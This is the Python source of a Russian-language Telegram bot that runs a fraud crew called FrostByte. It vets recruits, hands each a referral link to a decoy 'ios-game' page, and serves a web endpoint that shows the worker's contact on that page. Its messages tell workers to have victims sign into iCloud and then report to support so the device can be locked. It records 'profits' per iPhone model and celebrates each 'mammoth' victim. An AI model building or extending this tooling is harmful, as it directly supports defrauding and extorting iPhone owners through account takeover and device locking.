import asyncio
import logging
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton, ChatPermissions
)
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.client.session.aiohttp import AiohttpSession

from aiohttp import web

from config import (
    BOT_TOKEN, ADMIN_ID, ADMIN_USERNAME, CHAT_ID, MANUAL_CHANNEL_ID,
    PROXY_URL, GITHUB_USERNAME, WEB_SERVER_PORT
)
from database import Database

logging.basicConfig(level=logging.INFO)

if PROXY_URL:
    session = AiohttpSession(proxy=PROXY_URL)
    bot = Bot(token=BOT_TOKEN, session=session)
else:
    bot = Bot(token=BOT_TOKEN)

storage = MemoryStorage()
dp = Dispatcher(storage=storage)
db = Database()

# =================== STATES ===================
class Registration(StatesGroup):
    experience = State()
    source = State()
    hours = State()

class Broadcast(StatesGroup):
    target = State()
    user_id = State()
    text = State()

class UserEdit(StatesGroup):
    percent = State()
    profit_amount = State()
    profit_service = State()
    profit_iphone = State()

class WorkerUsernameSet(StatesGroup):
    waiting = State()

# =================== KEYBOARDS ===================
def main_menu_kb(user_id: int):
    buttons = [
        [KeyboardButton(text="🧊 iCloud"), KeyboardButton(text="💬 Чат")],
        [KeyboardButton(text="📚 Мануал"), KeyboardButton(text="⚙️ Настройки")],
        [KeyboardButton(text="📊 О проекте")]
    ]
    if user_id == ADMIN_ID:
        buttons.append([KeyboardButton(text="⚙️ Админ-панель")])
    return ReplyKeyboardMarkup(keyboard=buttons, resize_keyboard=True)

def admin_panel_kb():
    buttons = [
        [KeyboardButton(text="📋 Список участников"), KeyboardButton(text="📢 Рассылка")],
        [KeyboardButton(text="🛑 STOP WORK"), KeyboardButton(text="▶️ START WORK")],
        [KeyboardButton(text="🔙 Назад в меню")]
    ]
    return ReplyKeyboardMarkup(keyboard=buttons, resize_keyboard=True)

def cancel_kb():
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="❌ Отмена")]],
        resize_keyboard=True
    )

# =================== HELPERS ===================
def is_admin(uid: int) -> bool:
    return uid == ADMIN_ID

async def show_main_menu(message: Message):
    await message.answer(
        "❄️ <b>Главное меню FrostByte</b>",
        reply_markup=main_menu_kb(message.from_user.id),
        parse_mode="HTML"
    )

async def show_admin_panel(message: Message):
    await message.answer(
        "🔧 <b>Админ-панель FrostByte</b>",
        reply_markup=admin_panel_kb(),
        parse_mode="HTML"
    )

async def show_users_list(message: Message, callback_prefix: str = "user_"):
    users = db.get_approved_users()
    if not users:
        await message.answer("😕 Нет одобренных участников.")
        return

    text = "📋 <b>Список участников:</b>\n\n"
    kb_buttons = []
    for i, u in enumerate(users, 1):
        text += f"{i}. [{u['user_id']}] @{u['username'] or 'нет'}\n"
        kb_buttons.append([InlineKeyboardButton(
            text=f"{i}. @{u['username'] or u['user_id']}",
            callback_data=f"{callback_prefix}{u['user_id']}"
        )])

    kb = InlineKeyboardMarkup(inline_keyboard=kb_buttons)
    await message.answer(text, reply_markup=kb, parse_mode="HTML")

# =================== WEB SERVER ===================
async def handle_worker(request):
    """GET /worker?ref=<user_id> — returns working username for the site."""
    ref = request.query.get('ref', 'default')
    username = ADMIN_USERNAME

    if ref.isdigit():
        user_id = int(ref)
        user = db.get_user(user_id)
        if user and user.get('worker_username'):
            username = user['worker_username']

    return web.json_response(
        {'username': username},
        headers={
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET',
            'Content-Type': 'application/json'
        }
    )

async def start_web_server():
    app = web.Application()
    app.router.add_get('/worker', handle_worker)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', WEB_SERVER_PORT)
    await site.start()
    logging.info(f"🌐 Web server started on port {WEB_SERVER_PORT}")

# =================== /START ===================
@dp.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    user = db.get_user(message.from_user.id)

    if not user:
        db.add_user(message.from_user.id, message.from_user.username or "unknown")
        await message.answer(
            "❄️ Ты попал в логово <b>FrostByte</b>.\n"
            "Мы принимаем не всех. Заполни анкету. 👇\n\n"
            "1️⃣ Твой опыт в сфере? (Кратко и по делу)",
            parse_mode="HTML"
        )
        await state.set_state(Registration.experience)
    elif user['status'] == 'pending':
        await message.answer("⏳ Твоя заявка на рассмотрении. Ожди.")
    elif user['status'] == 'rejected':
        await message.answer("❌ Твоя заявка была отклонена.")
    elif user['status'] == 'blocked':
        await message.answer("🚫 Ты заблокирован. Доступ к боту и ресурсам команды заблокирован.")
    elif user['status'] == 'approved':
        await show_main_menu(message)

# =================== REGISTRATION ===================
@dp.message(Registration.experience)
async def reg_experience(message: Message, state: FSMContext):
    await state.update_data(experience=message.text)
    await message.answer("2️⃣ Откуда узнал о нашей команде?")
    await state.set_state(Registration.source)

@dp.message(Registration.source)
async def reg_source(message: Message, state: FSMContext):
    await state.update_data(source=message.text)
    await message.answer("3️⃣ Сколько часов в день готов уделять работе?")
    await state.set_state(Registration.hours)

@dp.message(Registration.hours)
async def reg_hours(message: Message, state: FSMContext):
    data = await state.get_data()
    db.update_user_field(message.from_user.id, 'experience', data['experience'])
    db.update_user_field(message.from_user.id, 'source', data['source'])
    db.update_user_field(message.from_user.id, 'hours_per_day', message.text)

    text = (
        f"❄️ <b>Новая заявка в FrostByte!</b>\n\n"
        f"ID: <code>{message.from_user.id}</code>\n"
        f"@{message.from_user.username or 'нет_username'}\n"
        f"Опыт: {data['experience']}\n"
        f"Источник: {data['source']}\n"
        f"Часов/день: {message.text}"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Принять ✅", callback_data=f"approve_{message.from_user.id}"),
            InlineKeyboardButton(text="Отклонить ❌", callback_data=f"reject_{message.from_user.id}")
        ]
    ])

    await bot.send_message(ADMIN_ID, text, reply_markup=kb, parse_mode="HTML")
    await message.answer("✍️ Анкета отправлена на рассмотрение. Ожди решения.")
    await state.clear()

# =================== ADMIN APPROVE/REJECT ===================
@dp.callback_query(F.data.startswith("approve_"))
async def approve_user(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("Нет доступа.")
        return

    user_id = int(callback.data.split("_")[1])
    db.update_user_field(user_id, 'status', 'approved')

    await bot.send_message(
        user_id,
        "✅ <b>Заявка одобрена!</b>\n\n"
        "Добро пожаловать в FrostByte. Главное меню открыто.",
        reply_markup=main_menu_kb(user_id),
        parse_mode="HTML"
    )
    await callback.message.edit_text(callback.message.text + "\n\n✅ <b>Принято</b>", parse_mode="HTML")

@dp.callback_query(F.data.startswith("reject_"))
async def reject_user(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("Нет доступа.")
        return

    user_id = int(callback.data.split("_")[1])
    db.update_user_field(user_id, 'status', 'rejected')

    await bot.send_message(user_id, "❌ К сожалению, твоя заявка отклонена.")
    await callback.message.edit_text(callback.message.text + "\n\n❌ <b>Отклонено</b>", parse_mode="HTML")

# =================== USER MENU ===================
@dp.message(F.text == "🧊 iCloud")
async def icloud_menu(message: Message, state: FSMContext):
    user = db.get_user(message.from_user.id)
    if not user or user['status'] != 'approved':
        return

    if not user.get('worker_username'):
        await message.answer(
            "🦊 <b>Настройка рабочего аккаунта</b>\n\n"
            "Введите ваш рабочий юзернейм (без @), на который будут приходить клиенты:",
            reply_markup=cancel_kb(),
            parse_mode="HTML"
        )
        await state.set_state(WorkerUsernameSet.waiting)
        return

    await send_icloud_link(message, user)

async def send_icloud_link(message: Message, user: dict):
    """Sends personal referral link — format: ?ref=<user_id> (no prefix)."""
    ref = str(user['user_id'])
    link = f"https://{GITHUB_USERNAME}.github.io/ios-game/?ref={ref}"

    text = (
        f"🦊 <b>Ваша персональная ссылка для привлечения клиентов:</b>\n\n"
        f"{link}\n\n"
        f"Клиент увидит ваш контакт @{user['worker_username']}.\n"
        f"После того как клиент согласится войти в iCloud — немедленно обращайтесь к ТС для блокировки."
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔗 Моя ссылка", url=link)],
        [InlineKeyboardButton(text="✍️ Написать Т/С", url=f"https://t.me/{ADMIN_USERNAME}")]
    ])

    await message.answer(text, reply_markup=kb, parse_mode="HTML")

@dp.message(WorkerUsernameSet.waiting)
async def set_worker_username(message: Message, state: FSMContext):
    username = message.text.strip().replace("@", "").replace(" ", "")
    if not username:
        await message.answer("❌ Юзернейм не может быть пустым. Введите ещё раз:")
        return

    db.update_worker_username(message.from_user.id, username)
    await message.answer(f"✅ Рабочий юзернейм <b>@{username}</b> сохранён.", parse_mode="HTML")

    user = db.get_user(message.from_user.id)
    await send_icloud_link(message, user)
    await state.clear()

@dp.message(F.text == "💬 Чат")
async def chat_menu(message: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔗 Получить ссылку", callback_data="get_chat_link")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
    ])
    await message.answer(
        "💬 <b>Чат команды</b>\n\n"
        "Добро пожаловать в общий чат команды. Ссылка действительна 5 минут.",
        reply_markup=kb,
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "get_chat_link")
async def get_chat_link(callback: CallbackQuery):
    try:
        link = await bot.create_chat_invite_link(
            chat_id=CHAT_ID,
            expire_date=datetime.now() + timedelta(minutes=5),
            member_limit=1
        )
        await callback.message.edit_text(
            f"💬 <b>Ссылка на чат:</b>\n{link.invite_link}\n\n"
            f"⏳ Действительна 5 минут, одноразовая.",
            parse_mode="HTML"
        )
    except Exception as e:
        logging.error(e)
        await callback.answer("Ошибка создания ссылки. Проверь права бота в чате.", show_alert=True)

@dp.message(F.text == "📚 Мануал")
async def manual_menu(message: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔗 Получить ссылку", callback_data="get_manual_link")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
    ])
    await message.answer(
        "📚 <b>Мануалы</b>\n\n"
        "Здесь лежат инструкции. Изучи перед началом работы. Ссылка действительна 5 минут.",
        reply_markup=kb,
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "get_manual_link")
async def get_manual_link(callback: CallbackQuery):
    try:
        link = await bot.create_chat_invite_link(
            chat_id=MANUAL_CHANNEL_ID,
            expire_date=datetime.now() + timedelta(minutes=5),
            member_limit=1
        )
        await callback.message.edit_text(
            f"📚 <b>Ссылка на мануалы:</b>\n{link.invite_link}\n\n"
            f"⏳ Действительна 5 минут, одноразовая.",
            parse_mode="HTML"
        )
    except Exception as e:
        logging.error(e)
        await callback.answer("Ошибка создания ссылки. Проверь права бота в канале.", show_alert=True)

@dp.message(F.text == "⚙️ Настройки")
async def settings_menu(message: Message):
    user = db.get_user(message.from_user.id)
    if not user:
        return

    wu = user.get('worker_username') or 'не задан'
    text = (
        f"🦊 <b>Профиль FrostByte</b>\n\n"
        f"Ник: @{user['username'] or 'нет'}\n"
        f"Твой процент: {user['percent']}%\n"
        f"Всего успешных логов: {user['total_logs']}\n"
        f"Общая сумма профита: {user['total_profit']} RUB\n"
        f"Рабочий юзернейм: @{wu}\n\n"
        f"<i>Успех неизбежен, продолжай в том же духе.</i>"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✏️ Изменить юзернейм", callback_data="change_worker_username")]
    ])

    await message.answer(text, reply_markup=kb, parse_mode="HTML")

@dp.callback_query(F.data == "change_worker_username")
async def change_worker_username(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "Введите новый рабочий юзернейм (без @):",
        reply_markup=cancel_kb()
    )
    await state.set_state(WorkerUsernameSet.waiting)
    await callback.answer()

@dp.message(F.text == "📊 О проекте")
async def about_project(message: Message):
    stats = db.get_stats()
    text = (
        f"🌐 <b>Статистика FrostByte</b>\n\n"
        f"Общая сумма профитов команды: {stats['total_profit']} RUB\n"
        f"Общее количество успешных логов: {stats['total_logs']}\n\n"
        f"<i>Мы — сила, ломающая лёд. Только вперёд.</i>"
    )
    await message.answer(text, parse_mode="HTML")

@dp.callback_query(F.data == "back_to_menu")
async def back_to_menu(callback: CallbackQuery):
    await callback.message.delete()
    await show_main_menu(callback.message)

# =================== ADMIN PANEL ===================
@dp.message(F.text == "⚙️ Админ-панель")
async def admin_panel_entry(message: Message):
    if not is_admin(message.from_user.id):
        return
    await show_admin_panel(message)

@dp.message(F.text == "🔙 Назад в меню")
async def back_from_admin(message: Message, state: FSMContext):
    await state.clear()
    await show_main_menu(message)

@dp.message(F.text == "❌ Отмена")
async def cancel_action(message: Message, state: FSMContext):
    await state.clear()
    if is_admin(message.from_user.id):
        await show_admin_panel(message)
    else:
        await show_main_menu(message)

# ----- Users list -----
@dp.message(F.text == "📋 Список участников")
async def list_users(message: Message):
    if not is_admin(message.from_user.id):
        return
    await show_users_list(message)

@dp.callback_query(F.data == "back_users")
async def back_users(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    await callback.message.delete()
    await show_users_list(callback.message)

@dp.callback_query(F.data.startswith("user_"))
async def user_profile(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("Нет доступа.")
        return

    user_id = int(callback.data.split("_")[1])
    user = db.get_user(user_id)
    if not user:
        await callback.answer("Участник не найден.")
        return

    status_text = "🟢 Активен" if user['status'] == 'approved' else "🔴 Заблокирован"
    wu = user.get('worker_username') or 'не задан'

    text = (
        f"👤 <b>Участник:</b> @{user['username'] or 'нет'}\n"
        f"ID: <code>{user['user_id']}</code>\n"
        f"Процент выплат: {user['percent']}%\n"
        f"Успешных логов: {user['total_logs']}\n"
        f"Профит: {user['total_profit']} RUB\n"
        f"Рабочий юзернейм: @{wu}\n"
        f"Статус: {status_text}"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Изменить процент", callback_data=f"chp_{user_id}")],
        [InlineKeyboardButton(text="Добавить профит", callback_data=f"addp_{user_id}")],
        [
            InlineKeyboardButton(text="🚫 Заблокировать", callback_data=f"blk_{user_id}")
            if user['status'] == 'approved'
            else InlineKeyboardButton(text="✅ Разблокировать", callback_data=f"unblk_{user_id}")
        ],
        [InlineKeyboardButton(text="🔙 Назад к списку", callback_data="back_users")]
    ])

    await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")

# ----- Edit percent -----
@dp.callback_query(F.data.startswith("chp_"))
async def change_percent(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    user_id = int(callback.data.split("_")[1])
    await state.update_data(edit_user_id=user_id)
    await callback.message.answer("Введите новый процент выплат:", reply_markup=cancel_kb())
    await state.set_state(UserEdit.percent)
    await callback.answer()

@dp.message(UserEdit.percent)
async def set_percent(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    try:
        percent = int(message.text)
        data = await state.get_data()
        db.update_user_field(data['edit_user_id'], 'percent', percent)
        await message.answer(f"✅ Процент обновлён на {percent}%")
        await state.clear()
    except ValueError:
        await message.answer("❌ Введите число.")

# ----- Add profit -----
@dp.callback_query(F.data.startswith("addp_"))
async def add_profit_start(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    user_id = int(callback.data.split("_")[1])
    await state.update_data(edit_user_id=user_id)
    await callback.message.answer("Введите сумму профита в RUB:", reply_markup=cancel_kb())
    await state.set_state(UserEdit.profit_amount)
    await callback.answer()

@dp.message(UserEdit.profit_amount)
async def add_profit_amount(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    try:
        amount = int(message.text)
        await state.update_data(profit_amount=amount)

        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🍎 iCloud", callback_data="svc_icloud")],
            [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_profit")]
        ])
        await message.answer("Выберите сервис:", reply_markup=kb)
        await state.set_state(UserEdit.profit_service)
    except ValueError:
        await message.answer("❌ Введите число.")

@dp.callback_query(F.data == "cancel_profit")
async def cancel_profit(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.delete()
    await show_admin_panel(callback.message)

@dp.callback_query(F.data == "svc_icloud", StateFilter(UserEdit.profit_service))
async def select_service_icloud(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.update_data(profit_service="iCloud")
    await callback.message.answer("Введите модель iPhone:", reply_markup=cancel_kb())
    await state.set_state(UserEdit.profit_iphone)
    await callback.answer()

@dp.message(UserEdit.profit_iphone)
async def add_profit_iphone(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    iphone_model = message.text
    data = await state.get_data()
    user_id = data['edit_user_id']
    amount = data['profit_amount']
    service = data['profit_service']
    user = db.get_user(user_id)

    if not user:
        await message.answer("❌ Участник не найден.")
        await state.clear()
        return

    db.update_user_field(user_id, 'total_profit', user['total_profit'] + amount)
    db.update_user_field(user_id, 'total_logs', user['total_logs'] + 1)
    db.update_stats(profit=amount, logs=1)

    user_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✍️ Написать Т/С", url=f"https://t.me/{ADMIN_USERNAME}")]
    ])

    await bot.send_message(
        user_id,
        f"🎉 <b>Получен новый профит: +{amount} RUB.</b>\n"
        f"Ожидайте выплаты в течение 30 минут.\n"
        f"Если выплата не пришла — напишите Т/С.",
        reply_markup=user_kb,
        parse_mode="HTML"
    )

    chat_text = (
        f"🎉 <b>Успешная мамонтизация!</b>\n\n"
        f"💰 <b>Сервис:</b> {service}\n"
        f"💵 <b>Сумма:</b> {amount} RUB\n"
        f"📱 <b>Устройство:</b> iPhone {iphone_model}\n"
        f"👤 <b>Участник:</b> @{user['username'] or 'нет'}\n"
        f"📊 <b>Процент выплаты:</b> {user['percent']}%"
    )

    await bot.send_message(CHAT_ID, chat_text, parse_mode="HTML")
    await message.answer(f"✅ Профит +{amount} RUB добавлен.")
    await state.clear()

# ----- Block/Unblock -----
@dp.callback_query(F.data.startswith("blk_"))
async def block_user(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    user_id = int(callback.data.split("_")[1])
    db.update_user_field(user_id, 'status', 'blocked')

    banned_from = []
    for chat_id in [CHAT_ID, MANUAL_CHANNEL_ID]:
        try:
            await bot.ban_chat_member(chat_id=chat_id, user_id=user_id)
            banned_from.append(str(chat_id))
        except Exception as e:
            logging.warning(f"Failed to ban {user_id} from {chat_id}: {e}")

    try:
        await bot.send_message(
            user_id,
            "🚫 <b>Ты заблокирован.</b>\n"
            "Доступ к боту и ресурсам команды заблокирован.",
            parse_mode="HTML"
        )
    except Exception as e:
        logging.warning(f"Failed to notify blocked user {user_id}: {e}")

    await callback.answer(f"Заблокирован. Удалён из {len(banned_from)} чатов/каналов.")
    await user_profile(callback)

@dp.callback_query(F.data.startswith("unblk_"))
async def unblock_user(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    user_id = int(callback.data.split("_")[1])
    db.update_user_field(user_id, 'status', 'approved')

    unbanned_from = []
    for chat_id in [CHAT_ID, MANUAL_CHANNEL_ID]:
        try:
            await bot.unban_chat_member(chat_id=chat_id, user_id=user_id, only_if_banned=True)
            unbanned_from.append(str(chat_id))
        except Exception as e:
            logging.warning(f"Failed to unban {user_id} from {chat_id}: {e}")

    try:
        await bot.send_message(
            user_id,
            "✅ <b>Ты разблокирован.</b> Доступ к боту и ресурсам восстановлен.",
            parse_mode="HTML"
        )
    except Exception as e:
        logging.warning(f"Failed to notify unblocked user {user_id}: {e}")

    await callback.answer(f"Разблокирован. Восстановлен доступ к {len(unbanned_from)} чатам/каналам.")
    await user_profile(callback)

# =================== BROADCAST ===================
@dp.message(F.text == "📢 Рассылка")
async def broadcast_menu(message: Message):
    if not is_admin(message.from_user.id):
        return
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📢 Всем", callback_data="bc_all")],
        [InlineKeyboardButton(text="👤 Конкретному", callback_data="bc_one")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_admin")]
    ])
    await message.answer("Выбери тип рассылки:", reply_markup=kb)

@dp.callback_query(F.data == "back_admin")
async def back_admin(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    await callback.message.delete()
    await show_admin_panel(callback.message)

@dp.callback_query(F.data.startswith("bc_"))
async def broadcast_target(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    target = callback.data.split("_")[1]
    await state.update_data(bc_target=target)

    if target == "one":
        await show_users_list(callback.message, callback_prefix="bcuser_")
        await state.set_state(Broadcast.user_id)
    else:
        await callback.message.answer("Введите текст рассылки:", reply_markup=cancel_kb())
        await state.set_state(Broadcast.text)
    await callback.answer()

@dp.callback_query(F.data.startswith("bcuser_"))
async def broadcast_select_user(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    user_id = int(callback.data.split("_")[1])
    await state.update_data(bc_target_id=user_id)
    await callback.message.answer("Введите текст рассылки:", reply_markup=cancel_kb())
    await state.set_state(Broadcast.text)
    await callback.answer()

@dp.message(Broadcast.text)
async def broadcast_send(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    data = await state.get_data()
    text = message.text

    if data['bc_target'] == 'all':
        users = db.get_approved_users()
        count = 0
        for u in users:
            try:
                await bot.send_message(
                    u['user_id'],
                    f"📢 <b>Сообщение от администрации:</b>\n\n{text}",
                    parse_mode="HTML"
                )
                count += 1
            except Exception as e:
                logging.warning(f"Failed to send to {u['user_id']}: {e}")
        await message.answer(f"✅ Отправлено {count} участникам.")
    else:
        try:
            await bot.send_message(
                data['bc_target_id'],
                f"📢 <b>Сообщение от администрации:</b>\n\n{text}",
                parse_mode="HTML"
            )
            await message.answer("✅ Отправлено.")
        except Exception as e:
            await message.answer(f"❌ Ошибка: {e}")

    await state.clear()

# =================== STOP / START WORK ===================
@dp.message(F.text == "🛑 STOP WORK")
async def stop_work(message: Message):
    if not is_admin(message.from_user.id):
        return
    db.set_work_status(False)

    try:
        await bot.send_message(
            CHAT_ID,
            "🛑 <b>STOP WORK</b>\n\nРабота приостановлена. Ожди указаний.",
            parse_mode="HTML"
        )
    except Exception as e:
        logging.warning(f"Failed to send STOP WORK to chat: {e}")

    try:
        await bot.set_chat_permissions(
            CHAT_ID,
            permissions=ChatPermissions(can_send_messages=False)
        )
    except Exception as e:
        await message.answer(f"⚠️ Не удалось закрыть чат: {e}")

    users = db.get_approved_users()
    for u in users:
        try:
            await bot.send_message(
                u['user_id'],
                "🛑 <b>Работа приостановлена.</b> Ожди указаний.",
                parse_mode="HTML"
            )
        except Exception as e:
            logging.warning(e)

    await message.answer("🛑 Работа приостановлена.")

@dp.message(F.text == "▶️ START WORK")
async def start_work(message: Message):
    if not is_admin(message.from_user.id):
        return
    db.set_work_status(True)

    try:
        await bot.set_chat_permissions(
            CHAT_ID,
            permissions=ChatPermissions(
                can_send_messages=True,
                can_send_media_messages=True,
                can_send_other_messages=True,
                can_add_web_page_previews=True
            )
        )
    except Exception as e:
        await message.answer(f"⚠️ Не удалось открыть чат: {e}")

    try:
        await bot.send_message(
            CHAT_ID,
            "▶️ <b>START WORK</b>\n\nРабота возобновлена. Приступаем.",
            parse_mode="HTML"
        )
    except Exception as e:
        logging.warning(f"Failed to send START WORK to chat: {e}")

    users = db.get_approved_users()
    for u in users:
        try:
            await bot.send_message(
                u['user_id'],
                "▶️ <b>Работа возобновлена.</b> Приступаем.",
                parse_mode="HTML"
            )
        except Exception as e:
            logging.warning(e)

    await message.answer("▶️ Работа возобновлена.")

# =================== MAIN ===================
async def main():
    asyncio.create_task(start_web_server())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
